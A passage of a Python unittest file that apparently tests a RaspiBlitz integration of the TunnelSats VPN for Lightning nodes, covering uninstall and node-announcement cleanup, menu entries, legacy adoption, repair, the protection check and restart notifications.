        self.assertNotIn("remove_pending", mod.load_state(self.deps))

    # -- the VPN address in LND's node announcement -----------------------------------------
    REMOVE_ADDRESS = ["sudo", "-u", "bitcoin", "/usr/local/bin/lncli", "-n=mainnet", "--rpcserver", "localhost:10009",
                      "peers", "updatenodeannouncement", "--address_remove", "1.2.3.4:24556"]

    def announcement_updates(self):
        return [c for c in self.fake.calls if "updatenodeannouncement" in c]

    def test_the_vpn_address_is_taken_out_of_the_node_announcement_of_lnd(self):
        # LND saves the addresses it announces and announces them again at the next start, also
        # without TunnelSats; the guard record names the address, read before uninstall removes it
        self.record(ipv4="1.2.3.4")
        self.fake.getinfo["uris"].append("0280a@203.0.113.7:9735")
        uninstall = fixture_json("tool", "uninstall_disabled.json")

        def uninstall_clears_the_run_directory():
            shutil.rmtree(self.path("run/tunnelsats"))
            return 0, uninstall
        self.fake.its["uninstall"] = uninstall_clears_the_run_directory
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, "removed", []),
                         (doc["exit_code"], doc["removed"], doc["announce_cleanup"], doc["warnings"]), doc)
        self.assertEqual([self.REMOVE_ADDRESS], self.announcement_updates())
        self.assertLess(self.fake.calls.index(["systemctl", "start", "lnd.service"]),
                        self.fake.calls.index(self.REMOVE_ADDRESS))
        # the onion address and every other address stay
        self.assertEqual(["0280a@exampleonion.onion:9735", "0280a@203.0.113.7:9735"], self.fake.getinfo["uris"])

    def test_without_a_guard_record_the_endpoint_is_looked_up(self):
        self.fake.getent["de2.tunnelsats.com"] = (0, "1.2.3.4         STREAM de2.tunnelsats.com\n"
                                                     "1.2.3.4         DGRAM  \n")
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, "removed"), (doc["exit_code"], doc["announce_cleanup"]), doc)
        self.assertIn(["getent", "ahostsv4", "de2.tunnelsats.com"], self.fake.calls)
        self.assertEqual([self.REMOVE_ADDRESS], self.announcement_updates())

    def test_nothing_is_taken_out_when_lnd_does_not_announce_the_vpn_address(self):
        self.record(ipv4="1.2.3.4")
        self.fake.getinfo["uris"] = ["0280a@exampleonion.onion:9735"]
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, "none", []), (doc["exit_code"], doc["announce_cleanup"], doc["warnings"]), doc)
        self.assertEqual([], self.announcement_updates())

    def test_lnd_not_answering_in_time_leaves_the_command_as_a_note(self):
        self.record(ipv4="1.2.3.4")
        self.fake.getinfo = None
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, "lnd_not_ready"), (doc["exit_code"], doc["removed"], doc["announce_cleanup"]), doc)
        self.assertEqual([5] * 24, self.fake.sleeps)
        self.assertIn(" ".join(self.REMOVE_ADDRESS), doc["warnings"][-1])
        self.assertIn(" ".join(self.REMOVE_ADDRESS), mod.result_text(doc))
        self.assertEqual([], self.announcement_updates())

    def test_lnd_not_running_after_remove_leaves_the_command_as_a_note_without_waiting(self):
        self.record(ipv4="1.2.3.4")
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall.update({"ln_was_active": False, "ln_disabled": False})
        self.fake.its["uninstall"] = (0, uninstall)
        self.fake.units["lnd.service"]["ActiveState"] = "inactive"
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, "lnd_not_ready", []), (doc["exit_code"], doc["announce_cleanup"], self.fake.sleeps), doc)
        self.assertIn(" ".join(self.REMOVE_ADDRESS), doc["warnings"][-1])

    def test_a_failed_update_leaves_the_command_as_a_note(self):
        self.record(ipv4="1.2.3.4")
        self.fake.announce_rc = 1
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, "failed"), (doc["exit_code"], doc["removed"], doc["announce_cleanup"]), doc)
        self.assertEqual([self.REMOVE_ADDRESS], self.announcement_updates())
        self.assertIn(" ".join(self.REMOVE_ADDRESS), doc["warnings"][-1])

    def test_cln_is_skipped(self):
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall["unit"] = "lightningd.service"
        self.fake.its["uninstall"] = (0, uninstall)
        self.record(ipv4="1.2.3.4", base="lightningd")
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, "skipped"), (doc["exit_code"], doc["removed"], doc["announce_cleanup"]), doc)
        self.assertEqual([], [c for c in self.fake.calls if c[0] == "sudo"])


class TestMenu(ModuleTestCase):
    """The menu entries (menu_choices) and its START and RESTART action (menu_start); the dialog
    loop around them is interactive and not covered."""

    def setUp(self):
        super().setUp()
        self.store()
        self.activate_conf()

    def tags(self):
        return [tag for tag, _text in mod.menu_choices(self.deps, mod.load_state(self.deps),
                                                       mod.read_rb_conf(self.deps))[0]]

    def test_start_and_restart_only_while_tunnelsats_is_on(self):
        self.fake.units["lnd.service"]["ActiveState"] = "inactive"
        self.assertEqual(["STATUS", "CHECK", "RENEW", "TOPUP", "BACKUP", "REPAIR", "REMOVE", "START", "ABOUT"], self.tags())
        self.fake.units["lnd.service"]["ActiveState"] = "active"
        self.record(decision="tor-only", reason="emergency_block")
        self.assertEqual(["STATUS", "CHECK", "RENEW", "TOPUP", "BACKUP", "REPAIR", "REMOVE", "RESTART", "ABOUT"], self.tags())
        self.fake.conf_set("tunnelsats", "off")
        for active in ("inactive", "failed", "active"):
            self.fake.units["lnd.service"]["ActiveState"] = active
            self.assertEqual(["STATUS", "CHECK", "RENEW", "TOPUP", "BACKUP", "REPAIR", "REMOVE", "ABOUT"], self.tags())

    def test_menu_start_only_while_tunnelsats_is_on(self):
        self.fake.conf_set("tunnelsats", "off")
        self.assertIsNone(mod.menu_start(self.deps))
        self.assertEqual([], self.fake.calls_of("systemctl", "start"))
        self.fake.conf_set("tunnelsats", "on")
        self.assertEqual("lnd", mod.menu_start(self.deps))
        self.assertEqual("lnd", mod.menu_start(self.deps, restart=True))
        self.assertEqual([["systemctl", "start", "lnd.service"], ["systemctl", "restart", "lnd.service"]],
                         self.fake.calls_of("systemctl", "start") + self.fake.calls_of("systemctl", "restart"))

    def test_without_a_subscription(self):
        shutil.rmtree(self.path(mod.STATE_DIR))
        choices, notice = mod.menu_choices(self.deps, None, mod.read_rb_conf(self.deps), {"adopt_available": True})
        self.assertEqual((["BUY", "IMPORT", "ADOPT", "ABOUT"], None), ([tag for tag, _text in choices], notice))
        pending = mod.empty_pending()
        pending["order"] = {"order_id": "ord-1", "payment_hash": "a" * 64, "state": "awaiting_payment"}
        mod.save_pending(self.deps, pending)
        choices_resume, _ = mod.menu_choices(self.deps, None, mod.read_rb_conf(self.deps), {"adopt_available": False})
        self.assertEqual(["BUY", "RESUME", "IMPORT", "ABOUT"], [tag for tag, _text in choices_resume])

    def test_adopted_legacy_offers_upgrade(self):
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.store(mode="adopted_legacy")
        self.assertEqual(["STATUS", "CHECK", "RENEW", "TOPUP", "BACKUP", "UPGRADE", "REPAIR", "REMOVE", "ABOUT"], self.tags())
        state = mod.load_state(self.deps)
        state["activation_pending"] = True
        mod.save_state(self.deps, state)
        pending = mod.empty_pending()
        pending["renewal"] = {"renewal_id": "ren-1", "payment_hash": "b" * 64, "state": "awaiting_payment"}
        mod.save_pending(self.deps, pending)
        self.assertEqual(
            ["STATUS", "CHECK", "RENEW", "TOPUP", "BACKUP", "RESUME", "ACTIVATE", "UPGRADE", "REPAIR", "REMOVE", "ABOUT"],
            self.tags(),
        )

    def test_about_text_contains_brand_and_official_deeplinks(self):
        for expected in (
            "TunnelSats (https://tunnelsats.com)",
            "https://tunnelsats.com/guide",
            "https://tunnelsats.com/status",
            "https://tunnelsats.com/faq",
            "https://tunnelsats.com/support",
            "https://api.tunnelsats.com",
        ):
            self.assertIn(expected, mod.ABOUT_TEXT)


class TestAdopt(ModuleTestCase):
    def snapshot(self):
        out = {}
        for base, _dirs, files in os.walk(self.root):
            rel = os.path.relpath(base, self.root)
            if rel.startswith(("mnt/hdd/app-data/tunnelsats", "run/tunnelsats")):
                continue
            for name in files:
                with open(os.path.join(base, name), "rb") as handle:
                    out[os.path.join(rel, name)] = hashlib.sha256(handle.read()).hexdigest()
        return out

    def test_adopt_step1_stores_the_subscription_and_changes_nothing_else(self):
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        legacy = fixture("import", "website.conf").replace("DNS = 8.8.8.8", "DNS = 8.8.8.8\nPostUp = /etc/wireguard/tunnelsats-route-guard.sh")
        self.write("etc/wireguard/tunnelsatsv2.conf", legacy)
        self.write("mnt/hdd/app-data/custom-installs.sh",
                   "#!/bin/bash\nsudo wg-quick up tunnelsatsv2\n# >>> TunnelSats block (managed by internet.tunnelsats.sh, do not edit) >>>\n"
                   "echo tunnelsats inside\n# <<< TunnelSats block <<<\necho tunnelsats outside\n")
        before = self.snapshot()
        doc = self.run_verb("adopt")
        self.assertEqual(0, doc["exit_code"], doc)
        self.assertTrue(doc["adopted"])
        self.assertEqual("legacy_v3_post_204", doc["legacy_kind"])
        self.assertEqual([2, 6], [entry["line"] for entry in doc["custom_installs_lines"]])
        self.assertTrue(doc["upgrade_available"])
        self.assertEqual(before, self.snapshot())
        self.assertEqual([], [c for c in self.fake.calls if c[0] in (mod.BLITZ_CONF, "systemctl")])
        self.assertEqual([[mod.ITS, "detect", "--json"]], self.fake.calls_of(mod.ITS))
        self.assertEqual("adopted_legacy", self.read_json(mod.STATE_FILE)["mode"])
        self.assertNotIn(b"PostUp", self.read_bytes(mod.CONF_FILE))
        self.assertEqual("unsafe", self.run_verb("check")["verdict"])

    def test_adopt_upgrade_converts_legacy_or_adopted_legacy_to_managed(self):
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        legacy = fixture("import", "website.conf").replace("DNS = 8.8.8.8", "DNS = 8.8.8.8\nPostUp = /etc/wireguard/tunnelsats-route-guard.sh")
        self.write("etc/wireguard/tunnelsatsv2.conf", legacy)
        self.record()
        doc = self.run_verb("adopt", "--upgrade", "--yes")
        self.assertEqual((0, "protected"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertTrue(doc["adopted"] and doc["upgraded"] and not doc["upgrade_available"])
        self.assertEqual("legacy_v3_post_204", doc["legacy_kind"])
        self.assertEqual("managed", self.read_json(mod.STATE_FILE)["mode"])
        self.assertIn([mod.ITS, "adopt", "--impl", "lnd", "--json"], self.fake.calls)
        # two-step: adopt first, then adopt --upgrade --yes reuses the stored config
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.fake.calls.clear()
        self.run_verb("adopt")
        os.unlink(self.path("etc/wireguard/tunnelsatsv2.conf"))
        doc2 = self.run_verb("adopt", "--upgrade", "--yes")
        self.assertEqual((0, "protected", True), (doc2["exit_code"], doc2["verdict"], doc2["upgraded"]), doc2)
        self.assertEqual("managed", self.read_json(mod.STATE_FILE)["mode"])

    def test_adopt_upgrade_failure_rolls_back_flag_and_keeps_adopted_legacy(self):
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        self.write("etc/wireguard/tunnelsatsv2.conf", fixture("import", "website.conf"))
        self.fake.its["adopt"] = (6, fixture_json("tool", "install_capability.json"))
        self.fake.its["audit lnd --repair"] = (1, {"contract": 1, "command": "its.audit", "status": "not_checked",
                                                   "errors": [{"code": "E_UNIT_ACTIVE", "class": "refused",
                                                               "message": "lnd.service is active"}]})
        doc = self.run_verb("adopt", "--upgrade", "--yes")
        self.assertEqual((3, "E_CAPABILITY_MISSING"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
        self.assertEqual("off", mod.read_rb_conf(self.deps)["tunnelsats"])
        self.assertEqual("adopted_legacy", self.read_json(mod.STATE_FILE)["mode"])

    def test_adopt_upgrade_failure_after_teardown_repairs_at_rest_and_keeps_flag_on(self):
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        self.write("etc/wireguard/tunnelsatsv2.conf", fixture("import", "website.conf"))
        self.fake.its["adopt"] = (1, {"contract": 1, "command": "adopt", "ok": False, "exit_code": 1,
                                      "errors": [{"code": "E_KILLSWITCH", "class": "operational",
                                                  "message": "kill switch failed"}]})
        doc = self.run_verb("adopt", "--upgrade", "--yes")
        self.assertEqual((1, "E_KILLSWITCH"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
        self.assertEqual("on", mod.read_rb_conf(self.deps)["tunnelsats"])
        self.assertIn([mod.ITS, "audit", "lnd", "--repair", "--json"], self.fake.calls)
        self.assertEqual("adopted_legacy", self.read_json(mod.STATE_FILE)["mode"])

    def test_adopt_upgrade_partial_stores_managed_and_warns(self):
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        self.write("etc/wireguard/tunnelsatsv2.conf", fixture("import", "website.conf"))
        self.record()
        partial = dict(self.fake.its["adopt"][1])
        partial.update({"ok": False, "exit_code": 1, "ln_restarted": False,
                        "errors": [{"code": "E_PARTIAL", "class": "operational",
                                    "message": "Adopted, but lnd.service did not start"}]})
        self.fake.its["adopt"] = (1, partial)
        doc = self.run_verb("adopt", "--upgrade", "--yes")
        self.assertTrue(doc["adopted"] and doc["upgraded"] and not doc["upgrade_available"])
        self.assertIn("E_PARTIAL", doc["warnings"])
        self.assertEqual("managed", self.read_json(mod.STATE_FILE)["mode"])

    def test_refusals(self):
        self.assertEqual((2, "E_CONFIRMATION_REQUIRED"), tuple(
            (d["exit_code"], d["errors"][0]["code"]) for d in [self.run_verb("adopt", "--upgrade")])[0])
        self.assertEqual((3, "E_NOTHING_TO_ADOPT"), tuple(
            (d["exit_code"], d["errors"][0]["code"]) for d in [self.run_verb("adopt", "--upgrade", "--yes")])[0])
        self.assertEqual(3, self.run_verb("adopt")["exit_code"])
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))
        self.assertEqual(14, self.run_verb("adopt")["exit_code"])
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_legacy.json"))
        self.write("etc/wireguard/tunnelsatsv2.conf",
                   fixture("import", "website.conf").replace("de2.tunnelsats.com:51820", "203.0.113.9:51820"))
        self.assertEqual("E_ENDPOINT_NOT_ALLOWED", self.run_verb("adopt")["errors"][0]["code"])


class TestRepair(ModuleTestCase):
    def test_older_tool_is_reinstalled_and_lightning_started_again(self):
        self.store()
        self.activate_conf()
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))
        self.fake.its["status"] = (0, {"tool_hash": "accepted_older"})
        doc = self.run_verb("repair", "--yes")
        self.assertEqual(["uninstall", "reenable", "install"], doc["actions"][:3])
        self.assertLess(self.fake.calls.index([mod.ITS, "uninstall", "--json"]),
                        self.fake.index_of(mod.ITS, "install"))
        self.assertLess(self.fake.calls.index([mod.ITS, "audit", "lnd", "--repair", "--json"]),
                        self.fake.calls.index(["systemctl", "enable", "lnd.service"]))

    def test_a_unit_disabled_by_uninstall_is_enabled_only_after_a_tor_only_audit(self):
        self.store()
        self.activate_conf()
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))
        self.fake.its["status"] = (0, {"tool_hash": "accepted_older"})
        line = "/mnt/hdd/app-data/lnd/lnd.conf:8:externalhosts=de2.tunnelsats.com:24556"
        self.fake.its["audit lnd --repair"] = (1, {"status": "unrepairable", "reason": "backup_failed",
                                                   "keys": ["externalhosts"], "lines": [line]})
        doc = self.run_verb("repair", "--yes")
        self.assertEqual((1, "E_AT_REST_UNREPAIRABLE"), (doc["exit_code"], doc["errors"][0]["code"]))
        self.assertEqual(([line], "systemctl enable --now lnd.service"),
                         (doc["action_required"]["lines"], doc["action_required"]["then"]))
        self.assertEqual(["uninstall"], doc["actions"])
        self.assertEqual([], self.fake.calls_of("systemctl", "enable"))
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "install"))

    def older_tool(self):
        self.store()
        self.activate_conf()
        self.fake.its["detect"] = [(0, fixture_json("tool", "detect_managed.json")),
                                   (0, fixture_json("tool", "detect_none.json"))]
        self.fake.its["status"] = (0, {"tool_hash": "accepted_older"})

    def test_a_lost_report_is_read_back_and_a_config_not_tor_only_keeps_lightning_stopped(self):
        # R4-6: the old dataplane is gone and LND stopped and disabled; the report is missing
        self.older_tool()
        self.lose_the_report()
        line = "/mnt/hdd/app-data/lnd/lnd.conf:8:externalhosts=de2.tunnelsats.com:24556"
        self.fake.its["audit lnd --repair"] = (1, {"status": "unrepairable", "reason": "backup_failed",
                                                   "keys": ["externalhosts"], "lines": [line]})
        doc = self.run_verb("repair", "--yes")
        self.assertEqual((1, "E_AT_REST_UNREPAIRABLE"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
        self.assertEqual(([line], "systemctl enable --now lnd.service"),
                         (doc["action_required"]["lines"], doc["action_required"]["then"]))
        self.assertEqual(["uninstall"], doc["actions"])
        self.assertIn("E_TOOL_OUTPUT", doc["warnings"][0])
        self.assertEqual([], self.fake.calls_of("systemctl", "enable"))
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "install"))

    def test_a_lost_report_and_a_tor_only_config_go_on_with_the_install(self):
        self.older_tool()
        self.lose_the_report()
        doc = self.run_verb("repair", "--yes")
        self.assertEqual(["uninstall", "reenable", "install"], doc["actions"][:3], doc)
        self.assertIn("E_TOOL_OUTPUT", doc["warnings"][0])

    def test_a_lost_report_with_the_old_dataplane_still_there_stops_repair(self):
        self.older_tool()
        self.lose_the_report(still_managed=True)
        doc = self.run_verb("repair", "--yes")
        self.assertEqual((1, "E_REMOVE_INCOMPLETE"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
        self.assertEqual(["uninstall"], doc["actions"])
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "install"))

    def test_healthy_install_only_reapplies_block_and_timer(self):
        self.store()
        self.activate_conf()
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))
        doc = self.run_verb("repair", "--yes")
        self.assertEqual(["block", "tick_timer"], doc["actions"])
        self.assertEqual(-1, self.fake.index_of(mod.ITS, "uninstall"))
        # nothing restarted Lightning: no wait before the check
        self.assertEqual((None, []), (doc["ln_start_wait"], self.fake.sleeps))

    # -- the check after the reinstall waits until the restarted Lightning unit has started --
    def reinstall(self, reads, final="active", substate=None):
        """REPAIR on a node without the managed install: it activates again, and the tool's install
        restarts LND, which then stays activating for that many reads of its state (SubState
        substate while it does)."""
        self.store()
        self.activate_conf()
        self.record()
        self.starts_after_install(reads, final)
        if substate:
            self.fake.units["lnd.service"]["SubState"] = substate
        return self.run_verb("repair", "--yes")

    def test_the_check_waits_until_lightning_has_started(self):
        doc = self.reinstall(3)
        self.assertEqual((0, "protected", ["install", "start"]), (doc["exit_code"], doc["verdict"], doc["actions"]), doc)
        # one read by REPAIR's own start step, then the wait: two more starting reads, then active
        self.assertEqual({"unit": "lnd.service", "state": "active", "waited_s": 6, "outcome": "active"},
                         doc["ln_start_wait"])
        self.assertEqual([mod.LN_START_STEP] * 2, self.start_steps())
        self.assertNotIn("ln_start", doc["reasons"])

    def test_first_handshake_completing_after_reinstall_gives_protected(self):
        # Tunnelsats/raspiblitz#5: REPAIR reinstall waits for the handshake probe_tunnel initiated
        self.store()
        self.activate_conf()
        self.record()
        self.fake.its["verify"] = [TestImport.verify_no_handshake_yet(),
                                   (0, fixture_json("verify", "protected.json"))]
        doc = self.run_verb("repair", "--yes")
        self.assertEqual((0, "protected", []), (doc["exit_code"], doc["verdict"], doc["reasons"]), doc)
        self.assertEqual([mod.HANDSHAKE_STEP], self.fake.sleeps)

    def test_a_start_that_does_not_finish_is_reported_never_passed(self):
        # a slow start (SubState start, for example LND waiting for its wallet unlock)
        doc = self.reinstall(1000, substate="start")
        self.assertEqual((5, "degraded"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertEqual({"unit": "lnd.service", "state": "activating", "waited_s": mod.LN_START_WAIT,
                          "outcome": "timeout"}, doc["ln_start_wait"])
        check = [c for c in doc["checks"] if c["id"] == "ln_start"]
        self.assertEqual([("degraded", "fail")], [(c["class"], c["result"]) for c in check])
        self.assertIn("still starting after %d s" % mod.LN_START_WAIT, check[0]["detail"])
        self.assertIn("ln_start", doc["reasons"])
        self.assertIn(check[0]["detail"], doc["warnings"])

    def test_a_crash_loop_is_reported_as_failed_not_as_a_slow_start(self):
        # Restart=always, RestartSec=60: after each failed start the unit waits in activating with
        # SubState auto-restart, so it reads activating for the whole wait
        doc = self.reinstall(1000, substate="auto-restart")
        self.assertEqual((5, "degraded"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertEqual({"unit": "lnd.service", "state": "auto-restart", "waited_s": mod.LN_START_WAIT,
                          "outcome": "failed"}, doc["ln_start_wait"])
        check = [c for c in doc["checks"] if c["id"] == "ln_start"]
        self.assertIn("lnd.service stopped while starting (auto-restart): see journalctl -u lnd.service",
                      check[0]["detail"])
        self.assertNotIn("wallet", check[0]["detail"])
        self.assertIn("ln_start", doc["reasons"])
        # one read of SubState, only after the wait ended in activating
        self.assertEqual(1, len([c for c in self.fake.calls if c[:2] == ["systemctl", "show"] and "SubState" in c]))

    def test_a_unit_that_fails_while_starting_is_reported(self):
        doc = self.reinstall(2, "failed")
        self.assertEqual((5, "degraded"), (doc["exit_code"], doc["verdict"]), doc)
        self.assertEqual({"unit": "lnd.service", "state": "failed", "waited_s": 3, "outcome": "failed"},
                         doc["ln_start_wait"])
        check = [c for c in doc["checks"] if c["id"] == "ln_start"]
        self.assertIn("stopped while starting (failed)", check[0]["detail"])
        self.assertIn("ln_start", doc["reasons"])

    def test_refusals(self):
        self.assertEqual(3, self.run_verb("repair", "--yes")["exit_code"])
        self.store(mode="adopted_legacy")
        self.assertEqual(14, self.run_verb("repair", "--yes")["exit_code"])

    def test_tor_off_is_refused_before_anything_changes(self):
        self.store()
        self.fake.conf_set("runBehindTor", "off")
        self.fake.calls.clear()
        doc = self.run_verb("repair", "--yes")
        self.assertEqual((14, "E_TOR_REQUIRED", "refused"),
                         (doc["exit_code"], doc["errors"][0]["code"], doc["errors"][0]["class"]))
        self.assertIn("SETTINGS", doc["errors"][0]["message"])
        self.assertEqual([], [c for c in self.fake.calls if c[0] in (mod.ITS, mod.BLITZ_CONF, "systemctl")])
        self.assertNotIn("tunnelsats=on", self.read_bytes(mod.RB_CONF).decode())


# ------------------------------------------------------------------------------------------
# CHECK
# ------------------------------------------------------------------------------------------

class TestCheck(ModuleTestCase):
    def setUp(self):
        super().setUp()
        self.store()
        self.activate_conf()
        self.record()

    def ids(self, doc, result="fail"):
        return [c["id"] for c in doc["checks"] if c["result"] == result]

    def test_protected_when_everything_holds(self):
        doc = self.run_verb("check")
        self.assertEqual(("protected", 0), (doc["verdict"], doc["exit_code"]), self.ids(doc))
        self.assertEqual("hybrid", doc["guard"]["decision"])
        self.assertEqual("protected", self.read_json(mod.STATE_FILE)["last_check"]["verdict"])

    def test_flags_without_a_hybrid_decision_are_unsafe(self):
        self.record(decision="tor-only", reason="verify_unsafe")
        doc = self.run_verb("check")
        self.assertEqual("unsafe", doc["verdict"])
        self.assertIn("ln_runtime_flags", self.ids(doc))

    def test_decision_of_another_start_is_degraded(self):
        self.record(invocation="f" * 32)
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])
        self.fake.getinfo = {"uris": ["0280a@exampleonion.onion:9735"]}
        doc = self.run_verb("check")
        self.assertEqual("degraded", doc["verdict"])
        self.assertIn("ln_runtime_flags", self.ids(doc))

    def test_tunnel_down_is_degraded_with_clearnet_blocked(self):
        self.fake.its["verify"] = (5, fixture_json("verify", "activating_tunnel_down.json"))
        doc = self.run_verb("check")
        self.assertEqual(("degraded", 5), (doc["verdict"], doc["exit_code"]))
        self.assertTrue(doc["clearnet_blocked"])

    def test_foreign_clearnet_address_is_unsafe(self):
        self.fake.getinfo = {"uris": ["0280a@1.2.3.4:24556", "0280a@exampleonion.onion:9735",
                                      "0280a@198.51.100.7:9735"]}
        doc = self.run_verb("check")
        self.assertEqual("unsafe", doc["verdict"])
        self.assertIn("announce", self.ids(doc))

    def test_lnd_announces_the_vpn_address_resolved_at_the_start_or_now(self):
        verify = fixture_json("verify", "protected.json")
        cases = [
            # record without the address (older guard), verify knows it now
            (None, "1.2.3.4", ["0280a@1.2.3.4:24556"], "protected"),
            # the endpoint moved since the start: both addresses count
            ("5.6.7.8", "1.2.3.4", ["0280a@5.6.7.8:24556"], "protected"),
            ("5.6.7.8", "1.2.3.4", ["0280a@1.2.3.4:24556"], "protected"),
            # DNS fails now: the address of the start still counts
            ("1.2.3.4", None, ["0280a@1.2.3.4:24556"], "protected"),
            # any other address, the VPN address on another port, a private address: unsafe
            ("1.2.3.4", "1.2.3.4", ["0280a@9.9.9.9:24556"], "unsafe"),
            ("1.2.3.4", "1.2.3.4", ["0280a@1.2.3.4:9735"], "unsafe"),
            ("1.2.3.4", "10.0.0.1", ["0280a@10.0.0.1:24556"], "unsafe"),
        ]
        for recorded, live, uris, verdict in cases:
            with self.subTest(recorded=recorded, live=live, uris=uris):
                self.record(ipv4=recorded)
                verify["endpoint"]["ipv4"] = live
                self.fake.its["verify"] = (0, verify)
                self.fake.getinfo = {"uris": uris + ["0280a@exampleonion.onion:9735"]}
                doc = self.run_verb("check")
                self.assertEqual(verdict, doc["verdict"], self.ids(doc))
                self.assertEqual(verdict == "unsafe", "announce" in self.ids(doc))

    def test_restart_needed_after_a_tor_only_start(self):
        self.record(decision="tor-only", reason="emergency_block")
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])
        self.fake.getinfo = {"uris": ["0280a@exampleonion.onion:9735"]}
        doc = self.run_verb("check")
        self.assertTrue(doc["restart_needed"])
        self.assertEqual("degraded", doc["verdict"])
        self.assertIn([mod.ITS, "guard", "lnd", "mainnet", "--dry-run", "--json"], self.fake.calls)

    def test_cln_daemon_below_sh_is_found_in_proc(self):
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.store(impl="cl")
        self.activate_conf("cl")
        self.fake.units["lightningd.service"].update({"ActiveState": "active", "InvocationID": INVOCATION,
                                                      "MainPID": "5000"})
        self.fake.units["lnd.service"]["ActiveState"] = "inactive"
        self.fake.its["verify"] = (0, fixture_json("verify", "cln_protected.json"))
        self.fake.its["audit cl"] = (0, {"status": "clean", "eligible": True, "keys": []})
        self.fake.its["audit lnd"] = (1, {"status": "unrepairable", "reason": "config_missing"})
        self.record(base="lightningd", ipv4="1.2.3.4")
        os.unlink(self.path("run/tunnelsats/guard-lnd.json"))
        self.cmdline(5000, ["/bin/sh", "-c", "/usr/local/bin/lightningd --conf=x $TUNNELSATS_CLN_ARGS"])
        self.cmdline(5001, ["/usr/local/bin/lightningd", "--conf=/home/bitcoin/.lightning/config",
                            "--bind-addr=0.0.0.0:9735", "--announce-addr=1.2.3.4:24556", "--always-use-proxy=false",
                            "--announce-addr-discovered=false"], ppid=5000)
        self.fake.getinfo = {"address": [{"type": "ipv4", "address": "1.2.3.4", "port": 24556},
                                         {"type": "torv3", "address": "exampleonion.onion", "port": 9736}],
                             "binding": [{"address": "127.0.0.1", "port": 9736}, {"address": "0.0.0.0", "port": 9735}]}
        doc = self.run_verb("check")
        self.assertEqual("protected", doc["verdict"], self.ids(doc))

    def test_dataplane_not_installed_is_degraded_tor_only(self):
        self.fake.its["verify"] = (3, fixture_json("verify", "not_installed.json"))
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])
        self.record(decision="tor-only", reason="not_installed")
        self.fake.getinfo = {"uris": ["0280a@exampleonion.onion:9735"]}
        self.fake.its["guard"] = (0, {"decision": "tor-only", "reason": "not_installed"})
        doc = self.run_verb("check")
        self.assertEqual("degraded", doc["verdict"], self.ids(doc))

    def test_not_configured_and_tunnelsats_off(self):
        self.fake.conf_set("tunnelsats", "off")
        self.assertEqual(3, self.run_verb("check")["exit_code"])
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.fake.its["verify --no-probe"] = (9, fixture_json("verify", "unmanaged.json"))
        doc = self.run_verb("check")
        self.assertEqual(("unsafe", ["legacy_lifecycle"]), (doc["verdict"], doc["reasons"]))


# ------------------------------------------------------------------------------------------
# tick (the restart notice)
# ------------------------------------------------------------------------------------------

class TestTick(ModuleTestCase):
    def setUp(self):
        super().setUp()
        self.store()
        self.activate_conf()
        self.record(decision="tor-only", reason="emergency_block")
        self.cmdline(4242, ["/usr/local/bin/lnd", "--configfile=/mnt/hdd/app-data/lnd/lnd.conf"])

    def notifies(self):
        return self.fake.calls_of(mod.NOTIFY, "send")

    def test_one_notification_per_start_only_when_notifications_are_on(self):
        self.fake.conf_set("notify", "on")
        doc = self.run_verb("tick")
        self.assertTrue(doc["restart_needed"])
        self.assertEqual([{"event": "restart_needed", "outcome": "handed_off", "attempt": 1}], doc["notifications"])
        self.assertEqual([[mod.NOTIFY, "send", mod.RESTART_MESSAGE]], self.notifies())
        self.assertEqual([], self.run_verb("tick")["notifications"])
        self.assertEqual(1, len(self.notifies()))
        self.assertIn("notify event=restart_needed outcome=handed_off attempt=1", self.logs)
        self.fake.units["lnd.service"]["InvocationID"] = "e" * 32
        self.record(decision="tor-only", reason="emergency_block", invocation="e" * 32)
        self.assertEqual("handed_off", self.run_verb("tick")["notifications"][0]["outcome"])
        self.assertEqual(2, len(self.notifies()))

    def test_notifications_off_never_calls_blitz_notify(self):
        doc = self.run_verb("tick")
        self.assertEqual("skipped_disabled", doc["notifications"][0]["outcome"])
        self.assertEqual([], self.notifies())
        self.assertEqual([], self.run_verb("tick")["notifications"])

    def test_a_failed_notification_is_retried_at_most_twice(self):
        self.fake.conf_set("notify", "on")
        self.fake.notify_rc = 1
        outcomes = [(d["notifications"] or [{}])[0].get("outcome") for d in
                    [self.run_verb("tick") for _ in range(4)]]
        self.assertEqual(["failed", "failed", "dropped", None], outcomes)
        self.assertEqual(3, len(self.notifies()))

    def test_conditions(self):
